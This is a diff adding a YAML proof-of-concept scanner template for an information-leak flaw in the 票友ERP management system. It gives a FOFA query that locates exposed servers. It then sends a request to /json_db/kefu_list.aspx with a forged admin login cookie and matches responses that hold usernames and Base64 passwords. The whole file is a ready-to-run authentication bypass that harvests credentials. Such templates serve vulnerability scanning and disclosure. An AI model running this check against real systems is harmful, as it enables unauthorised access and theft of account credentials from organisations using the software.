@@ -1,0 +1,18 @@
+id: poc-yaml-piaoyou-erp-ms-kefu-list-aspx-info-leak
+info:
+  name: 票友ERP管理系统 kefu_list.aspx 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: 票友ERP管理系统
+  fofa: (body="css/sexybuttons.css" && body="Ajax/confirm.ashx") || title="票友ERP"
+requests:
+- method: GET
+  path: /json_db/kefu_list.aspx
+  headers:
+    Cookie: pyerpcookie=loginname=admin
+  expression: status_code == 200 && matches(body,"\"username\":\"([0-9a-zA-Z]+)\",")
+    && matches(body,"\"password\":\"([A-Za-z0-9+/]+={0,2})\",") && contains(body,"\"total\":")
+    && !contains(body,"<")
+variables: {}
+transport: http
